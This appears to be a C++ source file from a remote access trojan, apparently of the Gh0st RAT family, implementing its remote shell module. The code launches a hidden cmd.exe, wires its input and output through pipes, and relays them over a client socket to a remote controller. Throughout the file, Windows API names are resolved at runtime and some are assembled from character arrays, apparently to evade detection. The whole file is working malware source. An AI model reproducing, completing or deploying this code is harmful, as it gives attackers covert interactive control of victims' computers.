// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ShellManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////



CShellManager::~CShellManager()
{
	typedef  BOOL (WINAPI *TerminateThreadT)
		(
		__in HANDLE hThread, __in DWORD dwExitCode
		);
	TerminateThreadT pTerminateThread = (TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"TerminateThread");

	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);
	
	typedef DWORD (WINAPI *WaitForSingleObjectT)
		(
		__in HANDLE hHandle,
		__in DWORD dwMilliseconds
		);
	char bcONXFi[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),bcONXFi);
	
	typedef BOOL (WINAPI *TerminateProcessT)
		(
		__in HANDLE hProcess, __in UINT uExitCode
		);
	TerminateProcessT pTerminateProcess = (TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"TerminateProcess");

	
	typedef BOOL
		(WINAPI
		*DisconnectNamedPipeT)(
		__in HANDLE hNamedPipe
		);
	DisconnectNamedPipeT pDisconnectNamedPipe=(DisconnectNamedPipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"DisconnectNamedPipe");

	pTerminateThread(m_hThreadRead, 0);
	pTerminateProcess(m_hProcessHandle, 0);
	pTerminateThread(m_hThreadHandle, 0);
	pWaitForSingleObject(m_hThreadMonitor, 2000);
	pTerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		pDisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		pDisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		pDisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		pDisconnectNamedPipe(m_hWritePipeShell);

    pCloseHandle(m_hReadPipeHandle);
    pCloseHandle(m_hWritePipeHandle);
    pCloseHandle(m_hReadPipeShell);
    pCloseHandle(m_hWritePipeShell);

    pCloseHandle(m_hProcessHandle);
	pCloseHandle(m_hThreadHandle);
	pCloseHandle(m_hThreadMonitor);
    pCloseHandle(m_hThreadRead);
}
CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);

	typedef UINT (WINAPI *GetSystemDirectoryAT)
		(
		__out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
		__in UINT uSize
		);
	GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetSystemDirectoryA");

	typedef BOOL (WINAPI *CreatePipeT)
		(
		__out_ecount_full(1) PHANDLE hReadPipe,
		__out_ecount_full(1) PHANDLE hWritePipe,
		__in_opt LPSECURITY_ATTRIBUTES lpPipeAttributes,
		__in     DWORD nSize
		);
	CreatePipeT pCreatePipe = (CreatePipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreatePipe");

	typedef  VOID  (WINAPI *GetStartupInfoAT)
		(
		__out LPSTARTUPINFOA lpStartupInfo
		);
	GetStartupInfoAT pGetStartupInfoA = (GetStartupInfoAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetStartupInfoA");

	typedef BOOL (WINAPI *CreateProcessAT)
		(
		__in_opt    LPCSTR lpApplicationName,
		__inout_opt LPSTR lpCommandLine,
		__in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes,
		__in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes,
		__in        BOOL bInheritHandles,
		__in        DWORD dwCreationFlags,
		__in_opt    LPVOID lpEnvironment,
		__in_opt    LPCSTR lpCurrentDirectory,
		__in        LPSTARTUPINFOA lpStartupInfo,
		__out       LPPROCESS_INFORMATION lpProcessInformation
		);
	CreateProcessAT pCreateProcessA = (CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateProcessA");

    SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

	
    if(!pCreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	pCloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	pCloseHandle(m_hWritePipeShell);
		return;
    }

    if(!pCreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	pCloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	pCloseHandle(m_hReadPipeShell);
		return;
    }

	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));

	pGetStartupInfoA(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	pGetSystemDirectoryA(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");

	if (!pCreateProcessA(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		pCloseHandle(m_hReadPipeHandle);
		pCloseHandle(m_hWritePipeHandle);
		pCloseHandle(m_hReadPipeShell);
		pCloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	typedef BOOL (WINAPI *ReadFileT)
		(
		__in        HANDLE hFile,
		__out_bcount_part(nNumberOfBytesToRead, *lpNumberOfBytesRead) LPVOID lpBuffer,
		__in        DWORD nNumberOfBytesToRead,
		__out_opt   LPDWORD lpNumberOfBytesRead,
		__inout_opt LPOVERLAPPED lpOverlapped
		);
	ReadFileT pReadFile = (ReadFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"ReadFile");

	typedef HLOCAL (WINAPI *LocalAllocT)
		(
		__in UINT uFlags,
		__in SIZE_T uBytes
		);
	LocalAllocT pLocalAlloc = (LocalAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalAlloc");

	typedef HLOCAL (WINAPI *LocalFreeT)
		(
		__deref HLOCAL hMem
		);
	LocalFreeT pLocalFree = (LocalFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFree");

	typedef VOID (WINAPI *SleepT)
		(
		__in DWORD dwMilliseconds
		);
	SleepT pSleep = (SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Sleep");

	typedef BOOL (WINAPI *PeekNamedPipeT)
		(
		__in      HANDLE hNamedPipe,
		__out_bcount_part_opt(nBufferSize, *lpBytesRead) LPVOID lpBuffer,
		__in      DWORD nBufferSize,
		__out_opt LPDWORD lpBytesRead,
		__out_opt LPDWORD lpTotalBytesAvail,
		__out_opt LPDWORD lpBytesLeftThisMessage
		);
	PeekNamedPipeT pPeekNamedPipe = (PeekNamedPipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"PeekNamedPipe");

	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		pSleep(100);
		while (pPeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)pLocalAlloc(LPTR, TotalBytesAvail);
			pReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// ·¢ËÍÊý¾Ý
			pThis->Send(lpBuffer, BytesRead);
			pLocalFree(lpBuffer);
		}
	}
	return 0;
}
void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	typedef BOOL (WINAPI *WriteFileT)
		(
		__in        HANDLE hFile,
		__in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
		__in        DWORD nNumberOfBytesToWrite,
		__out_opt   LPDWORD lpNumberOfBytesWritten,
		__inout_opt LPOVERLAPPED lpOverlapped
		);
	WriteFileT pWriteFile = (WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WriteFile");
	
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	pWriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	typedef  BOOL (WINAPI *TerminateThreadT)
		(
		__in HANDLE hThread, __in DWORD dwExitCode
		);
	TerminateThreadT pTerminateThread = (TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"TerminateThread");

	typedef BOOL (WINAPI *TerminateProcessT)
		(
		__in HANDLE hProcess, __in UINT uExitCode
		);
	TerminateProcessT pTerminateProcess = (TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"TerminateProcess");

	typedef DWORD (WINAPI *WaitForMultipleObjectsT)
		(
		__in DWORD nCount,
		__in_ecount(nCount) CONST HANDLE *lpHandles,
		__in BOOL bWaitAll,
		__in DWORD dwMilliseconds
		);
	WaitForMultipleObjectsT pWaitForMultipleObjects = (WaitForMultipleObjectsT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WaitForMultipleObjects");

	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	pWaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	pTerminateThread(pThis->m_hThreadRead, 0);
	pTerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
